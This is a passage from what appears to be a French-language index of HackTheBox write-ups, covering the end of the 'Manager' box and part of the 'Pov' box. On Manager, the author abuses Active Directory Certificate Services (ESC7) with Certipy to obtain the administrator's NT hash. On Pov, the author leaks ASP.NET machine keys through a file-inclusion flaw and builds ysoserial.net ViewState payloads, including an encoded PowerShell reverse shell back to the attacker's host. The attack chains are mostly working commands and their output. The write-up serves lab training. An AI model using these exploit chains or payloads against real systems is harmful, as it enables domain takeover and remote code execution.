11:39:17\n[+] userAccountControl:                 SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION\n\n\n[?] +++++ Searching for Exchange Servers +++++\n\n[?] +++++ Searching for ADCS Servers +++++\n[+] Found ADCS Server 'DC01$':\nsAMAccountName:                         DC01$\ndistinguishedName:                      CN=DC01,OU=Domain Controllers,DC=manager,DC=htb\nobjectSid:                              S-1-5-21-4078382237-1492182817-2568127209-1000\noperatingsystem:                        Windows Server 2019 Standard\nmemberOf:                               CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=manager,DC=htb\n                                        CN=Cert Publishers,CN=Users,DC=manager,DC=htb\npwdLastSet:                             10/16/2023 14:00:03\nlastLogonTimestamp:                     02/20/2024 11:39:17\n[+] userAccountControl:                 SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION\n\n\n[?] +++++ Searching for Outdated Operating Systems +++++\n\n[?] +++++ Searching for Detailed Active Directory Information with BloodHound +++++\n</code></pre> <p>Je pense que cela va tourner autour des certificats :)... Uploadons certify.exe, ce sera peut-\u00eatre utile.</p> <pre><code>*Evil-WinRM* PS C:\\Users\\Raven\\Documents&gt; .\\Certify.exe find /vulnerable\n\n   _____          _   _  __\n  / ____|        | | (_)/ _|\n | |     ___ _ __| |_ _| |_ _   _\n | |    / _ \\ '__| __| |  _| | | |\n | |___|  __/ |  | |_| | | | |_| |\n  \\_____\\___|_|   \\__|_|_|  \\__, |\n                             __/ |\n                            |___./\n  v1.0.0\n\n[*] Action: Find certificate templates\n[*] Using the search base 'CN=Configuration,DC=manager,DC=htb'\n\n[*] Listing info about the Enterprise CA 'manager-DC01-CA'\n\n    Enterprise CA Name            : manager-DC01-CA\n    DNS Hostname                  : dc01.manager.htb\n    FullName                      : dc01.manager.htb\\manager-DC01-CA\n    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED\n    Cert SubjectName              : CN=manager-DC01-CA, DC=manager, DC=htb\n    Cert Thumbprint               : ACE850A2892B1614526F7F2151EE76E752415023\n    Cert Serial                   : 5150CE6EC048749448C7390A52F264BB\n    Cert Start Date               : 7/27/2023 3:21:05 AM\n    Cert End Date                 : 7/27/2122 3:31:04 AM\n    Cert Chain                    : CN=manager-DC01-CA,DC=manager,DC=htb\n    UserSpecifiedSAN              : Disabled\n    CA Permissions                :\n      Owner: BUILTIN\\Administrators        S-1-5-32-544\n\n      Access Rights                                     Principal\n\n      Deny   ManageCA, Read                             MANAGER\\Operator              S-1-5-21-4078382237-1492182817-2568127209-1119\n      Allow  Enroll                                     NT AUTHORITY\\Authenticated UsersS-1-5-11\n      Allow  ManageCA, ManageCertificates               BUILTIN\\Administrators        S-1-5-32-544\n      Allow  ManageCA, ManageCertificates               MANAGER\\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512\n      Allow  ManageCA, ManageCertificates               MANAGER\\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519\n      Allow  ManageCA, Enroll                           MANAGER\\Raven                 S-1-5-21-4078382237-1492182817-2568127209-1116\n      Allow  Enroll                                     MANAGER\\Operator              S-1-5-21-4078382237-1492182817-2568127209-1119\n    Enrollment Agent Restrictions : None\n\n[+] No Vulnerable Certificates Templates found!\n\n\n\nCertify completed in 00:00:08.0592263\n</code></pre>"},{"location":"Writeup/HTB/Machines/Manager/#privesc-admin-esc7","title":"Privesc Admin - ESC7","text":"<p>On dirait qu'on a tout ce qu'il faut pour abuser des certificats, let's go !</p> <pre><code>pak@DESKTOP-AF1CU53:~/tmp$ certipy ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Successfully added officer 'Raven' on 'manager-DC01-CA'\n\npak@DESKTOP-AF1CU53:~/tmp$ certipy ca -ca 'manager-DC01-CA' -enable-template SubCA -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Successfully enabled 'SubCA' on 'manager-DC01-CA'\n\npak@DESKTOP-AF1CU53:~/tmp$ certipy req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -target manager.htb -template SubCA -upn administrator@manager.htb\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Requesting certificate via RPC\n[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.\n[*] Request ID is 13\nWould you like to save the private key? (y/N) y\n[*] Saved private key to 13.key\n[-] Failed to request certificate\n\npak@DESKTOP-AF1CU53:~/tmp$ certipy ca -ca \"manager-DC01-CA\" -issue-request 13 -username 'raven@manager.htb' -password 'R4v3nBe5tD3veloP3r!\n123'\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Successfully issued certificate\n\npak@DESKTOP-AF1CU53:~/tmp$ certipy req -username 'raven@manager.htb' -password 'R4v3nBe5tD3veloP3r!123' -ca \"manager-DC01-CA\" -target manager.htb -retrieve 13\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Rerieving certificate with ID 13\n[*] Successfully retrieved certificate\n[*] Got certificate with UPN 'administrator@manager.htb'\n[*] Certificate has no object SID\n[*] Loaded private key from '13.key'\n[*] Saved certificate and private key to 'administrator.pfx'\n</code></pre> <p>Puis on r\u00e9cup\u00e8re le hash de l'administrateur :</p> <pre><code>pak@DESKTOP-AF1CU53:~/tmp$ certipy auth -pfx administrator.pfx\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Using principal: administrator@manager.htb\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saved credential cache to 'administrator.ccache'\n[*] Trying to retrieve NT hash for 'administrator'\n[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef\n</code></pre> <pre><code>pak@DESKTOP-AF1CU53:~/tmp$ crackmapexec smb 10.129.5.92 -u administrator -H 'ae5064c2f62317332c88629e025924ef'\nSMB         10.129.5.92     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)\nSMB         10.129.5.92     445    DC01             [+] manager.htb\\administrator:ae5064c2f62317332c88629e025924ef (Pwn3d!)\n</code></pre>"},{"location":"Writeup/HTB/Machines/Pov/","title":"Pov","text":"Room Pov Url https://app.hackthebox.com/machines/Pov Sujets Web/Windows Active/Retired lors de la r\u00e9solution Active Difficult\u00e9 Medium"},{"location":"Writeup/HTB/Machines/Pov/#nmap","title":"Nmap","text":"<pre><code>pak@laptop:~$ nmap -p- -A -vv 10.129.39.248\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-20 20:13 CET\nNSE: Loaded 156 scripts for scanning.\nNSE: Script Pre-scanning.\nNSE: Starting runlevel 1 (of 3) scan.\nInitiating NSE at 20:14\nCompleted NSE at 20:14, 0.00s elapsed\nNSE: Starting runlevel 2 (of 3) scan.\nInitiating NSE at 20:14\nCompleted NSE at 20:14, 0.00s elapsed\nNSE: Starting runlevel 3 (of 3) scan.\nInitiating NSE at 20:14\nCompleted NSE at 20:14, 0.00s elapsed\nInitiating Ping Scan at 20:14\nScanning 10.129.39.248 [2 ports]\nCompleted Ping Scan at 20:14, 0.02s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 20:14\nCompleted Parallel DNS resolution of 1 host. at 20:14, 0.00s elapsed\nInitiating Connect Scan at 20:14\nScanning 10.129.39.248 [65535 ports]\nDiscovered open port 80/tcp on 10.129.39.248\nConnect Scan Timing: About 20.42% done; ETC: 20:16 (0:02:01 remaining)\nConnect Scan Timing: About 48.81% done; ETC: 20:16 (0:01:04 remaining)\nCompleted Connect Scan at 20:15, 104.45s elapsed (65535 total ports)\nInitiating Service scan at 20:15\nScanning 1 service on 10.129.39.248\nCompleted Service scan at 20:15, 7.08s elapsed (1 service on 1 host)\nNSE: Script scanning 10.129.39.248.\nNSE: Starting runlevel 1 (of 3) scan.\nInitiating NSE at 20:15\nCompleted NSE at 20:15, 5.06s elapsed\nNSE: Starting runlevel 2 (of 3) scan.\nInitiating NSE at 20:15\nCompleted NSE at 20:15, 0.20s elapsed\nNSE: Starting runlevel 3 (of 3) scan.\nInitiating NSE at 20:15\nCompleted NSE at 20:15, 0.00s elapsed\nNmap scan report for 10.129.39.248\nHost is up, received syn-ack (0.022s latency).\nScanned at 2024-03-20 20:14:00 CET for 117s\nNot shown: 65534 filtered tcp ports (no-response)\nPORT   STATE SERVICE REASON  VERSION\n80/tcp open  http    syn-ack Microsoft IIS httpd 10.0\n|_http-favicon: Unknown favicon MD5: E9B5E66DEBD9405ED864CAC17E2A888E\n| http-methods:\n|   Supported Methods: OPTIONS TRACE GET HEAD POST\n|_  Potentially risky methods: TRACE\n|_http-title: pov.htb\n|_http-server-header: Microsoft-IIS/10.0\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n</code></pre> <p>Uniquement du web. C'est pas ce que je pr\u00e9f\u00e8re... </p> <p>Enum\u00e9ration des sous-domaines :</p> <pre><code>pak@laptop:~$ ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt -u http://10.129.39.248 -H \"HOST: FUZZ.pov.htb\" -fs 12330\n\n        /'___\\  /'___\\           /'___\\\n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n          \\/_/    \\/_/   \\/___/    \\/_/\n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.129.39.248\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt\n :: Header           : Host: FUZZ.pov.htb\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response size: 12330\n________________________________________________\n\nceop                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 981ms]\ndev                     [Status: 302, Size: 152, Words: 9, Lines: 2, Duration: 8638ms]\n:: Progress: [151265/151265] :: Job [1/1] :: 1212 req/sec :: Duration: [0:05:49] :: Errors: 0 ::\n</code></pre> <p>Un fuzzing des r\u00e9pertoires sur les diff\u00e9rents sous-domaine n'a rien donn\u00e9, nuclei non plus.</p> <p>Sur le domaine dev.pov.htb j'ai pu remarquer qu'un cv \u00e9tait t\u00e9l\u00e9chargeable : il est possible, en interceptant la requ\u00eate, de faire une LFI :</p> <p></p> <p>J'ai alors tent\u00e9 d'inclure divers fichiers, mais rien de probant... J'ai donc cherch\u00e9 si ce type de requ\u00eate ne permettait pas un exploit, et j'ai vu que \u00e7a parlait d'ysoserial.net. </p> <p>Je tente de crafter une commande un peu au pif avec les informations que j'ai :</p> <pre><code>PS D:\\Tools\\ysoserial.net\\ysoserial\\bin\\Release&gt; .\\ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c \"powershell.exe Invoke-WebRequest -Uri http://10.10.16.17:8000\" --path=\"/portfolio/default.aspx\" --apppath=\"/\" --decryptionalg=\"AES\" --decryptionkey=\"74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43\"  --validationalg=\"SHA1\" --validationkey=\"5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468\"\nYNa532yBv%2FlsMHA6tJ9jFqnu6cXCxIpf7jKmwNer2V%2BxakQ3G1SaO45wS9HKm%2BxrQcWEplWD8ShUNabrgBvRgL2%2F6XqdZsgl1B6SJHWQ807e46t5CSL5%2B4FQ76tqNr9E3ypt7wCxJjY5j18qYcLhH22FHFTAEckUKSYJjngs%2FIBaRgcsgpmCyWdU7Cfs0caxWRiM%2BN0Gfkssrj%2F%2B20WU8XOHK3rnQWtbWIww3%2BK61tbZnDBnXWDsl%2F9vz1DA7AROMnHnG1eEk%2Fcxbpe%2BKhEa15jc2wi4sf93rpIBbSvzX4EporsFOreHlRMOAnKPir5M1b6c2idwNRCk%2BROo0NAPwTHjIQYOJGYteDhKUviR%2Bj9pCzZRhx5OFBe6w1dhSdwyjzK3lPWY3THWQn2Cfoor%2B1kPd8urzk6QgXY%2FoyTmCHMqE4F2PGzOS25w5mkhIXcO%2Fc%2FVTfnf81DyciCy1pybEUy2I%2FS6xhV25i2gD83xUfjmQ4YV9VEE4mEiCCflt44O2K3DZXJcODo1eSV7ok%2B8AxWycEVxFhGJ6RCmzXUTVV7yAI6c1jKVaqCSnlvCoZ5PFpoidVCr95gTqwoO5a%2F3Wq0nMib82cr6hDgk0M42Nb1Yx3V5uENai2IiTVsDVqz22yQpFTGEAWrZ%2BU5lOTC0aXr5YHK1gj4G0A15o89JYHazYsB8fFzTycJmTzuCuWBEuf%2FJ0duKMhoSXw2gPaACgwSnKLjZ4eIdn%2BOomUcZ1jH712kdI0izP22JSqRNdgSwbajfpp3TPNmuEtTpnGak5YUKnnCdrvEr8panBgz86AjA7Mvt6ovDrhzuOpO7sOh%2FP8hoPjBNzIwbTrlYS0lyB7mce7X%2FgYYzCUNYOaBKeMrNwNf7CHHeW%2BA1R0ptuL16CBPxAZt1oB8ztWXSXkqBhbesi5ev4PMqdjCNMETg6Igzor2jGf8YdYg0yJZrcfRWcOIJ93ApcLY6DYynuB0SDmfwACZEhR%2FnJFwT2gGlOBulCqyRS37bo7PcwrIZYs0x%2BPjT9vvNIqsWMg8P5iV0WPpFHSSPtN3x6wcljCWIspRL3NIePDHpXA99lLPYuslzlVqmF8azLdNOAaJqYHba2n%2FRPItCBQgNTDZ6mThDkEN1MHoLpM2NNuNw5s0lKvsI26U22oXkZPgvAM6%2BlIL4Qmt%2FluiHttz%2FkNoWegBnEykRrWVhNMYj6ssQNaA6Vknvrml6qDvhC6dH%2F%2FXE%2F9RVXeJilpF5hLZO5Ak1OUmISktTK3JF8k5tkVwmdOyl3SMqXwytU2B3PIiLYhZ3d8o5kwo2zgBHQZ%2F0MHHss5Lab0FnAhhYifQY0X6klIWRbVS0a17FOQ%3D%3D\n</code></pre> <pre><code>POST /portfolio/ HTTP/1.1\nHost: dev.pov.htb\nContent-Length: 1700\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://dev.pov.htb\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.95 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://dev.pov.htb/portfolio/\nAccept-Encoding: gzip, deflate, br\nAccept-Language: en-US,en;q=0.9\nConnection: close\n\n__EVENTTARGET=download&amp;__EVENTARGUMENT=&amp;__VIEWSTATE=YNa532yBv%2FlsMHA6tJ9jFqnu6cXCxIpf7jKmwNer2V%2BxakQ3G1SaO45wS9HKm%2BxrQcWEplWD8ShUNabrgBvRgL2%2F6XqdZsgl1B6SJHWQ807e46t5CSL5%2B4FQ76tqNr9E3ypt7wCxJjY5j18qYcLhH22FHFTAEckUKSYJjngs%2FIBaRgcsgpmCyWdU7Cfs0caxWRiM%2BN0Gfkssrj%2F%2B20WU8XOHK3rnQWtbWIww3%2BK61tbZnDBnXWDsl%2F9vz1DA7AROMnHnG1eEk%2Fcxbpe%2BKhEa15jc2wi4sf93rpIBbSvzX4EporsFOreHlRMOAnKPir5M1b6c2idwNRCk%2BROo0NAPwTHjIQYOJGYteDhKUviR%2Bj9pCzZRhx5OFBe6w1dhSdwyjzK3lPWY3THWQn2Cfoor%2B1kPd8urzk6QgXY%2FoyTmCHMqE4F2PGzOS25w5mkhIXcO%2Fc%2FVTfnf81DyciCy1pybEUy2I%2FS6xhV25i2gD83xUfjmQ4YV9VEE4mEiCCflt44O2K3DZXJcODo1eSV7ok%2B8AxWycEVxFhGJ6RCmzXUTVV7yAI6c1jKVaqCSnlvCoZ5PFpoidVCr95gTqwoO5a%2F3Wq0nMib82cr6hDgk0M42Nb1Yx3V5uENai2IiTVsDVqz22yQpFTGEAWrZ%2BU5lOTC0aXr5YHK1gj4G0A15o89JYHazYsB8fFzTycJmTzuCuWBEuf%2FJ0duKMhoSXw2gPaACgwSnKLjZ4eIdn%2BOomUcZ1jH712kdI0izP22JSqRNdgSwbajfpp3TPNmuEtTpnGak5YUKnnCdrvEr8panBgz86AjA7Mvt6ovDrhzuOpO7sOh%2FP8hoPjBNzIwbTrlYS0lyB7mce7X%2FgYYzCUNYOaBKeMrNwNf7CHHeW%2BA1R0ptuL16CBPxAZt1oB8ztWXSXkqBhbesi5ev4PMqdjCNMETg6Igzor2jGf8YdYg0yJZrcfRWcOIJ93ApcLY6DYynuB0SDmfwACZEhR%2FnJFwT2gGlOBulCqyRS37bo7PcwrIZYs0x%2BPjT9vvNIqsWMg8P5iV0WPpFHSSPtN3x6wcljCWIspRL3NIePDHpXA99lLPYuslzlVqmF8azLdNOAaJqYHba2n%2FRPItCBQgNTDZ6mThDkEN1MHoLpM2NNuNw5s0lKvsI26U22oXkZPgvAM6%2BlIL4Qmt%2FluiHttz%2FkNoWegBnEykRrWVhNMYj6ssQNaA6Vknvrml6qDvhC6dH%2F%2FXE%2F9RVXeJilpF5hLZO5Ak1OUmISktTK3JF8k5tkVwmdOyl3SMqXwytU2B3PIiLYhZ3d8o5kwo2zgBHQZ%2F0MHHss5Lab0FnAhhYifQY0X6klIWRbVS0a17FOQ%3D%3D&amp;__VIEWSTATEGENERATOR=8E0F0FA3&amp;__EVENTVALIDATION=xN4J%2BRqc7RjO%2B6DYMdmQNNDEgW%2BSOBDBxJ8EOv5lnZNXpLq1GZ0JN64wjzyQBFoOX2P2kvacbe2wut%2BUD3MCqWdIPwR5SNj6vH5SMqgj6kvWWaTT8Usz%2BEAoIRycUBA2ZfzxEg%3D%3D&amp;file=/web.config\n</code></pre> <p>Et l'appel est bien re\u00e7u, nice !</p> <pre><code>pak@laptop:~$ nc -lnvp 8000\nlistening on [any] 8000 ...\nconnect to [10.10.16.17] from (UNKNOWN) [10.129.39.248] 49671\nGET / HTTP/1.1\nUser-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.17763.5328\nHost: 10.10.16.17:8000\nConnection: Keep-Alive\n</code></pre> <p>Le reverse-shell est donc tent\u00e9 :</p> <pre><code>PS D:\\Tools\\ysoserial.net\\ysoserial\\bin\\Release&gt; .\\ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c \"powershel\nl -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMQA3ACIALAA4ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==\" --path=\"/portfolio/default.aspx\" --apppath=\"/\" --decryptionalg=\"AES\" --decryptionkey=\"74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43\"  --validationalg=\"SHA1\" --validationkey=\"5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468\"\n</code></pre> <p>Ce qui nous donne :</p> <pre><code>POST /portfolio/ HTTP/1.1\nHost: dev.pov.htb\nContent-Length: 3504\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://dev.pov.htb\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.95 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://dev.pov.htb/portfolio/\nAccept-Encoding: gzip, deflate, br\nAccept-Language: en-US,en;q=0.9\nConnection: close\n\n__EVENTTARGET=download&amp;__EVENTARGUMENT=&amp;__VIEWSTATE=1%2BPbl9s9bp9xkASfskocFFwT%2Bx2uLP5EJJnwgqYZyZ0Qv%2B%2BFItH7ey3HD%2Bte2Aic0T0MviUCGOpECysr52pRAxWNmPywQKj%2Br28HYedziAlBOkrXGYPDw975wZNGa3sgk%2BHvCvkQY3J16L%2BQiFUAbaDqYXsSA4ZZ%2BisGnoSNIqv8bp55YDUkjMyVRWqQBfxGPB5AVK2cfviBShraUWlfDsZZpL%2Bln1mouDLbL7qYYBWGkvZw9BWH4IXq4dSQENxlGK4qLI0wNJ9Xx8kPTNsUF1CD54zap%2BllySs5RJYNMQd1YW041Za84oM2r06YpVEcHpa%2FuQl1NIcan6pz3lSzMH%2BbPP0fiaPg2qgs0cGiMSfBtM%2F0AIdJedPJyz3LDQgyEppiZCZz1ebTQuTKiH7RtCudcbbqkQr89gk9fGU3j%2B%2FLugD6RWiE5I8UfywfuYZDl9qELv3aCKEGOw72E9%2FsbCFNh5p2Z2vl8J6trziazjZIfQQMYakOuceLhVY70XIBJblDgcJZBrw5Xuql0iLMTzj80Ba9W529WmZXis28Br%2F6sLonUSr4GBszwsKBtCOmzf2N67ExfyXrR%2Bmc5mpyiYNkDeFdR3MrcjXb0QP2J5ipMMZK4X8zzXNvxIBDjVJvi9taXP%2BzFBQ%2FX4L0OoKYFAGlBHOb4f5U%2BQtCmTgOR%2Bd4KbZhZPvgOQuTXCy%2FiTM0QoQiXDJSkDhuUHnAbyxSNWYB0PzvbPbnYjDjn43pWA63AVcdYFk0f35WUnWkZvzd6i1YJd79WHWOZKct7ZU%2BPOmgZemv6PRwOs%2Bo5NCcvjyZ8rUgg4z9HCBRnlATatMDrjIfyIbMwB5gAZNQnCzTOsJjlY20uJcQrsIUUz1CaTYgLqk6sPrAq0AaHifUVn9IaD81NjFLFlkEUAM%2FxXbKA7G%2BO%2F0M9%2F5o2jPgDvpnMLlCZa3ndvwAQMl9NbL%2FxRGZHOJH8QKDzcuRX3zXm23QOBEjJSh5RSTTsUbnVwSJej37w2sGFXZkDQEDxHVFUHX5b9k9OfgB9a4Xo%2BKG%2FNmOdotbzhPqlHgenu5KFWv3tpwx2dQhU0VFhOkpgUudL5H%2FPjwTe%2FApEYtT07HmGftHBplCETZ1yOtpSX0u9zQu70M%2FZfveVOzzZyIV%2Fxu0aJ%2BrRkPfgGBzTfEgDBIV2hqFvSHOmvvEKHExNsFCJmrzesVb%2FH5ZjoNXBBazaODslfeOt768rn10D77ZpEhEO%2BiozmUBWdq2JEmqDieqpmJyQFHIiNpAsfVsMEccegUjBPctUYmqeeZxGEeUym3HsycgvHpph3rtWsu9f3ZqKaS8ZiEvC%2Bg2gpKoOFPKdfyv4S4duriT6W%2F1SbhSIK7qpnwRf0NUZj4XR%2F80zMs1zVWvjlbRY%2F8O2X8ZkfFyhbuxhdnX8GLKp2ZdCu7X16Q10DAdE1t8npOApDO1Dmbv3LFkU3EgBZVPTKQkHHdo4kZd8OdkWYXQQ%2B3lyNEsHGGONjyZxQEytTiMJhWmNmQKuCY6GuNjqcNBQGnYg%2FHr6J9O98asmkUW42G7ZQN%2BNCiaCI3lztNx9bPZM0zmXdryVt54otYGYs4heWvc9rGQ2Vfze0o3oZx9lXTH8eNt8MYltaktHELhvnwmvW%2FwhrbpvgDLrJ36EJDcVXOz1Z4daoThuAfQX2ajCM7u2ymtCekAgBMhSOlvSivJ8CQBC8wrz88Au1OaTdfZKoontyLa5nwAXCdWYhWsMH2MXbUnPHEu5cs63Gt1uoLGv5MjXZVM3uAGQHhdki3s7KvRdgIQl2NFVRX%2FO5lEWUdQRozUXLHzqvTFuL2oRsgaFxaapE3%2ByVWbWPhnCcL0aEsMKGqroof7K1RwdZwglxmGuBAM95AIOyM9sJdTSYXdvp4SlkCac8CqgUAGw%2Bf1ji%2FJgs7r1nunvLSli2smOjytIGG5%2BxuEeAYppwB2FADP2U1UHmqF3sTPYJeenxX4G6O%2FUiPdThJDCEX0KIe0JDJLkITD5siuDSqga8BVPYQTbSKfSs9205dR5lCYAxJYoDfRLEs11A04OyhHHhPPJLOJxRtD8m1kZAzWpgxuALhB7gz2E%2BteE%2F3IAJuHgilGFOHSetdYKNbfUZf4G2VXPLBMWo0Y0ugD4h7aumBv%2FgBpFClgRzKBTqxjh%2FA%2BARv2pSANWe42jb%2B8fOXsrnHlAumkVEyOWVe3mQ0gRPoAx7ak7gFDK2dbU7qChvteISumQfoGCOaA5jxD02tXI%2FV4cDVqUTZzKypOkBMF6LKsqP2nVX9Heeet9XI8OPmLiodDaEfQzcLDMhBXsKWT4wfbT4T%2Bn0swAZcbePzTj22XZdxGkEWe56r00EsuDF7wmBP5uHPISIyPjXTsHoUUI3H1Yx1R7hWtguv2rmIVKSmZYgk4e6HpCiAF2sh9OlA96LO0NKFSGai5dej8UzR43h1rN5eGIE4nU9RIYkLbne9B8MWlX0ejotApHerSt1coNiInSZqoHAl2WXypxNAgguu6U7XEmVij5umBjJ7QKYtsgr6wxDfbXeLCxirgzW1ZRlvrf6Cr6zpDgtIkOYXTVSG1%2BM0197j6wPqzGqCxQ6JI4Cqjq9E2EM4M%2FnvtQiF1rNZTRhaOXebaOnXe2CjoJKdDaI%2BmxBOCliVqAPf%2Bvrv9ywz7nuMVfdHg3cde3MgBb2MOG5u7AdOm5uDe83aaSbDb6yIBUR%2BSkHCVj81eqUaVTe%2Fwhu7p8KcoHJpq8apvCDIIzRuupjdQt3BG%2FQC6XG4PkGHFkPDIGYRC%2Fu8bD4gxygy1487sc08nDV%2FyyhEr0FQ3Hyurxnmg1rLuCmwYSAeh9gp4tOAJEQWJIpP38lg6S4XbrDOjA6GkUjHD%2BKEk2nlfAqksZN70eW3kF399EPLTbssv2vv6LmfJ7eXzW2vTXYhCSPWi9PDond8hQda0yGU%2BQs%2FsjHQ4yCPnEEwokBp6FVJ5Kd7aOSxPviKQffzRLbP0m93EBv3xxXx4WXeqzByW53dSTEHX8QkC9HvfmJLl7FXVVuUpV9JjsXtLKo5IUXF%2FzsEjvVwER%2BHs2969lgQQ7TZdGSFOUxYHVuRfzSydiw%3D%3D&amp;__VIEWSTATEGENERATOR=8E0F0FA3&amp;__EVENTVALIDATION=xN4J%2BRqc7RjO%2B6DYMdmQNNDEgW%2BSOBDBxJ8EOv5lnZNXpLq1GZ0JN64wjzyQBFoOX2P2kvacbe2wut%2BUD3MCqWdIPwR5SNj6vH5SMqgj6kvWWaTT8Usz%2BEAoIRycUBA2ZfzxEg%3D%3D&amp;file=/web.config\n</code></pre> <p>Et le reverse shell est re\u00e7u :</p> <pre><code>pak@laptop:~$ nc -lnvp 8001\nlistening on [any] 8001 ...\nconnect to [10.10.16.17] from (UNKNOWN) [10.129.39.248] 49674\ndir\n\n\n    Directory: C:\\windows\\system32\\inetsrv\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\nd-----        1/10/2024   6:44 AM                Config\nd-----       10/26/2023   4:30 PM                en\nd-----       10/26/2023   4:30 PM                en-US\n-a----       10/26/2023   2:48 PM         119808 appcmd.exe\n-a----        